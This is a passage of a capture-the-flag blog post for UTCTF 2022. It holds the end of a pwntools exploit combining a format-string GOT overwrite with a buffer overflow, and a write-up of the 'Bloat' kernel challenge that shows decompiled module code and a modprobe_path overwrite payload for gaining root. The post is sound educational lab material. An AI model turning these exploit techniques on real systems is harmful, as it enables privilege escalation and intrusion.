+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.utctf.live&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5004</span><span>)
+</span><span>    </span><span style="color:#ffa759;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">fmtstr_payload</span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span>{exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;__stack_chk_fail&#39;</span><span>]</span><span style="color:#ccc9c2cc;">: </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\xc3</span><span style="color:#bae67e;">&#39;</span><span>))})
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">112 </span><span style="color:#f29e74;">+ </span><span>payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">120 </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;get_flag&#39;</span><span>]))
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>utflag{just_a_little_salami15983350}</p>
+<h1 id="bloat"><a href="/utctf-2022/bloat">Bloat</a></h1>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>I&#39;ve created a new binary format. Unlike ELF, it has no bloat. It just consists of a virtual address to store the data at, then 248 bytes of data. However, when I tried to contribute it back to the mainline kernel they all called my submission &quot;idiotic&quot;, and &quot;wildly unsafe&quot;. They just cant recognize the next generation of Linux binaries.
+</span><span>
+</span><span>Login with username bloat and no password
+</span><span>
+</span><span>By Tristan (@trab on discord)
+</span><span>nc pwn.utctf.live 5003 
+</span></code></pre>
+<p><a href="/utctf-2022/bins/bzImage">bzImage</a>
+<a href="/utctf-2022/bins/rootfs.cpio.gz">rootfs.cpio.gz</a>
+<a href="/utctf-2022/bins/run.sh">run.sh</a></p>
+<p>fuck yeah "wildly unsafe" is my favorite phrase to hear. "A virtual address to store data and then 248 bytes of data" really screams arbitrary write to me. There isn't a lot of complexity to hide vulnerability so I suspected it would be the obvious one -- unchecked virtual address to copy the remainder of the data to. A quick look at run.sh shows that flag.txt is mounted as /dev/sda but that we'll need root to read it.</p>
+<p>Let's pop open the rootfs and see what can be found.</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">mkdir</span><span> rootfs
+</span><span style="color:#f28779;">cd</span><span> rootfs
+</span><span style="color:#ffd580;">gzip</span><span style="color:#ffcc66;"> -cd</span><span> ../rootfs.cpio.gz </span><span style="color:#f29e74;">| </span><span style="color:#ffd580;">cpio</span><span style="color:#ffcc66;"> -idmv
+</span></code></pre>
+<p>Poking around, there's a pretty good amount of stuff here (a minimal linux installation) but we know more or less that we're looking for a kernel module and so we quickly find <code>/lib/modules/5.15.0/extra/bloat.ko</code>. Let's open it up!</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">load_bloat_binary</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#ffcc66;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  ulong </span><span style="color:#f29e74;">*</span><span>puVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte </span><span style="color:#f29e74;">*</span><span>pbVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar5</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar6</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> lVar7</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 uVar8</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte </span><span style="color:#f29e74;">*</span><span>pbVar9</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar10</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_GS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">bool</span><span> bVar11</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">bool</span><span> bVar12</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte bVar13</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  bVar13 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  pbVar4 </span><span style="color:#f29e74;">= </span><span>(byte </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f28779;">strrchr</span><span>(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">**</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x60</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">L</span><span style="color:#bae67e;">&#39;.&#39;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  bVar11 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">;
+</span><span>  bVar12 </span><span style="color:#f29e74;">=</span><span> pbVar4 </span><span style="color:#f29e74;">== </span><span>(byte </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">!</span><span>bVar12) {
+</span><span>    lVar7 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2cc;">;
+</span><span>    pbVar9 </span><span style="color:#f29e74;">= </span><span>(byte </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#bae67e;">&quot;.bloat&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">do </span><span>{
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(lVar7 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>      lVar7 </span><span style="color:#f29e74;">=</span><span> lVar7 </span><span style="color:#f29e74;">+ -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      bVar11 </span><span style="color:#f29e74;">= *</span><span>pbVar4 </span><span style="color:#f29e74;">&lt; *</span><span>pbVar9</span><span style="color:#ccc9c2cc;">;
+</span><span>      bVar12 </span><span style="color:#f29e74;">= *</span><span>pbVar4 </span><span style="color:#f29e74;">== *</span><span>pbVar9</span><span style="color:#ccc9c2cc;">;
+</span><span>      pbVar4 </span><span style="color:#f29e74;">=</span><span> pbVar4 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar13 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      pbVar9 </span><span style="color:#f29e74;">=</span><span> pbVar9 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar13 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>    } </span><span style="color:#ffa759;">while </span><span>(bVar12)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>((</span><span style="color:#f29e74;">!</span><span>bVar11 </span><span style="color:#f29e74;">&amp;&amp; !</span><span>bVar12) </span><span style="color:#f29e74;">==</span><span> bVar11) {
+</span><span>      lVar7 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">generic_file_llseek</span><span>(</span><span style="color:#f29e74;">*</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x40</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffd580;">generic_file_llseek</span><span>(</span><span style="color:#f29e74;">*</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x40</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(lVar7 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x101</span><span>) {
+</span><span>        iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">begin_new_exec</span><span>(param_1)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(iVar3 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>          </span><span style="color:#ffa759;">return</span><span> iVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        puVar1 </span><span style="color:#f29e74;">= *</span><span>(ulong </span><span style="color:#f29e74;">**</span><span>)(</span><span style="color:#f29e74;">&amp;</span><span>current_task </span><span style="color:#f29e74;">+</span><span> in_GS_OFFSET)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)(puVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x6f</span><span>) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">set_binfmt</span><span>(bloat_fmt)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">setup_new_exec</span><span>(param_1)</span><span style="color:#ccc9c2cc;">;
+</span><span>        puVar2 </span><span style="color:#f29e74;">= *</span><span>(undefined </span><span style="color:#f29e74;">**</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xa0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        uVar8 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x7ffffffff000</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#f29e74;">*</span><span>(undefined </span><span style="color:#f29e74;">**</span><span>)(puVar1[</span><span style="color:#ffcc66;">0x62</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xf0</span><span>) </span><span style="color:#f29e74;">=</span><span> puVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(puVar1[</span><span style="color:#ffcc66;">0x62</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xf8</span><span>) </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(puVar1[</span><span style="color:#ffcc66;">0x62</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xf0</span><span>) </span><span style="color:#f29e74;">+</span><span> lVar7</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(((</span><span style="color:#f29e74;">*</span><span>puVar1 </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0x20000000</span><span>) </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#f29e74;">&amp;&amp;
+</span><span>           (uVar8 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xc0000000</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#f29e74;">*</span><span>(byte </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)puVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x37b</span><span>) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">8</span><span>) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>)) {
+</span><span>          uVar8 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xffffe000</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">setup_arg_pages</span><span>(param_1</span><span style="color:#ccc9c2cc;">,</span><span>uVar8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(iVar3 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>          </span><span style="color:#ffa759;">return</span><span> iVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffd580;">vm_mmap</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span>puVar2</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x100</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x12</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">__put_user_1</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>        iVar10 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">int</span><span>)lVar7</span><span style="color:#ccc9c2cc;">;
+</span><span>        iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x100</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(iVar10 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x101</span><span>) {
+</span><span>          iVar3 </span><span style="color:#f29e74;">=</span><span> iVar10</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">&lt;</span><span> iVar10) {
+</span><span>          puVar5 </span><span style="color:#f29e74;">=</span><span> puVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>          </span><span style="color:#ffa759;">do </span><span>{
+</span><span>            puVar6 </span><span style="color:#f29e74;">=</span><span> puVar5 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#f29e74;">*</span><span>puVar5 </span><span style="color:#f29e74;">=</span><span> puVar5[(param_1 </span><span style="color:#f29e74;">- </span><span>(</span><span style="color:#ffa759;">long</span><span>)puVar2) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xa8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>            puVar5 </span><span style="color:#f29e74;">=</span><span> puVar6</span><span style="color:#ccc9c2cc;">;
+</span><span>          } </span><span style="color:#ffa759;">while </span><span>((</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span>(</span><span style="color:#ffa759;">int</span><span>)puVar2) </span><span style="color:#f29e74;">+ </span><span>(</span><span style="color:#ffa759;">int</span><span>)puVar6 </span><span style="color:#f29e74;">&lt;</span><span> iVar3)</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffd580;">finalize_exec</span><span>(param_1)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">start_thread</span><span>(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">&amp;</span><span>current_task </span><span style="color:#f29e74;">+</span><span> in_GS_OFFSET) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x20</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x3f58</span><span style="color:#ccc9c2cc;">,</span><span>puVar2</span><span style="color:#ccc9c2cc;">,
+</span><span>                     </span><span style="color:#f29e74;">*</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)
+</span><span>                      (</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">&amp;</span><span>current_task </span><span style="color:#f29e74;">+</span><span> in_GS_OFFSET) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x310</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x120</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Ahahahahaha it's literally just that. It maps some RWX memory, copies the bytes from the rest of the file, and then executes. Unfortunately userspace code execution just won't do it so we need to do some kernel funny business to become root. All of this behavior happens as a binfmt handler which triggers for any file named ".bloat".</p>
+<p>I spent a good amount of time researching -- I've never actually done kernel exploitation before. I liked this challenge a lot for being rather easy but enough to sorta take the edge off my fear of kernel exploitation. After a while I found <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">a blog post on modprobe_path exploitation</a> which immediately looked quite promising.</p>
+<p>Turns out there is a nice "modprobe_path" symbol in the kernel which points to an executable. This executable gets called whenever you try and execute a binary that has no handler. I assume there is a reason but idk why. Good thing for me since this was super easy.</p>
+<p>This challenge was actually even easier than the challenge that blog post went over!  We have true arbitrary write and no kaslr so all I needed to do was grab the address of modprobe_path from /proc/kallsyms and then write a brief payload to overwrite it with my own script to run as root</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>modprobe_path </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0xffffffff82038180</span><span>)
+</span><span>payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(modprobe_path)
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/tmp/x</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(payload)
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#f28779;">echo </span><span style="color:#ffcc66;">-ne </span><span style="color:#bae67e;">&quot;\x80\x81\x03\x82\xff\xff\xff\xff/tmp/x\x00&quot; </span><span style="color:#f29e74;">&gt;</span><span> .bloat
+</span><span style="color:#f28779;">echo </span><span style="color:#ffcc66;">-ne </span><span style="color:#bae67e;">&quot;#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag&quot; </span><span style="color:#f29e74;">&gt;</span><span> x
+</span><span style="color:#f28779;">echo </span><span style="color:#ffcc66;">-ne </span><span style="color:#bae67e;">&quot;\xff\xff\xff\xff&quot; </span><span style="color:#f29e74;">&gt;</span><span> dummy
+</span><span style="color:#ffd580;">chmod</span><span> +x ./bloat
+</span><span style="color:#ffd580;">./bloat
+</span><span style="color:#ffd580;">./dummy
+</span><span>
+</span><span style="color:#ffd580;">cat</span><span> flag
+</span><span style="color:#ffd580;">utflag{oops_forgot_to_use_put_user283558318</span><span>}
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">13 March 2022</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
